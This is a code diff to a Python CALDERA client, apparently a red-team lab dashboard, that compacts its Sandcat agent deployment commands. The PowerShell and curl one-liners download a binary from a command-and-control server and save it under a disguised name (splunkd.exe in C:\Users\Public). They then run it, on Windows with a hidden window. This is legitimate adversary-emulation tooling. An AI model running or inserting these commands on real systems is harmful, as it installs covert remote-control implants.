@@ -313,45 +313,36 @@ class CalderaClient:
 
     def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
         """
-        Return one copyable Sandcat deploy block.
+        Return the copyable Sandcat deploy command shown in the dashboard.
 
-        The first variable is intentionally easy to edit because VM IPs change.
-        The comments are included in the copied command so users understand what
-        each part does before running it in an authorised lab target.
+        Keep the Windows command in the compact CALDERA style because it is
+        intended to be pasted as one editable PowerShell paragraph.
         """
         server = self._reachable_server_url(kali_ip)
         if not server:
             return (
-                "# CALDERA server is configured as localhost. Edit CALDERA_SERVER "
-                "to the Kali VM IP that the target can reach.\n"
-                "$CALDERA_SERVER=\"http://CHANGE-ME:8888\""
+                "$server=\"http://CHANGE-ME:8888\"; # change CHANGE-ME to your Kali VM IP"
             )
         payload_name = self._sandcat_payload_name(platform)
 
         if "win" in str(platform or "").lower():
             return (
-                f"# Edit this IP if your Kali VM address changes; it must be reachable from the target.\n"
-                f"$CALDERA_SERVER=\"{server}\";\n"
-                "# Download the official Sandcat payload from CALDERA.\n"
-                "$url=\"$CALDERA_SERVER/file/download\"; "
-                "$wc=New-Object System.Net.WebClient; "
-                "$wc.Headers.add(\"platform\",\"windows\"); "
-                f"$wc.Headers.add(\"file\",\"{payload_name}\"); "
-                "$data=$wc.DownloadData($url); "
-                "\n# Replace any old lab Sandcat copy, then start a fresh agent in the chosen group.\n"
-                "Get-Process | Where-Object {$_.Modules.FileName -like \"C:\\Users\\Public\\splunkd.exe\"} | Stop-Process -Force -ErrorAction SilentlyContinue; "
-                "Remove-Item -Force \"C:\\Users\\Public\\splunkd.exe\" -ErrorAction SilentlyContinue; "
-                "[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null; "
-                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $CALDERA_SERVER -group {group}\" -WindowStyle Hidden;"
+                f"$server=\"{server}\";"
+                "$url=\"$server/file/download\";"
+                "$wc=New-Object System.Net.WebClient;"
+                "$wc.Headers.add(\"platform\",\"windows\");"
+                f"$wc.Headers.add(\"file\",\"{payload_name}\");"
+                "$data=$wc.DownloadData($url);"
+                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;"
+                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;"
+                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;"
+                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\" -WindowStyle hidden;"
             )
 
         return (
-            "# Edit this IP if your Kali VM address changes; it must be reachable from the target.\n"
-            f"CALDERA_SERVER='{server}';\n"
-            "# Download the official Sandcat payload from CALDERA.\n"
-            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$CALDERA_SERVER/file/download\" -o sandcat; "
-            "\n# Start a fresh agent in the chosen group.\n"
-            f"chmod +x sandcat; ./sandcat -server \"$CALDERA_SERVER\" -group {group}"
+            f"server='{server}'; "
+            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
+            f"chmod +x sandcat; ./sandcat -server \"$server\" -group {group}"
         )
 
     def get_adversary_list(self):
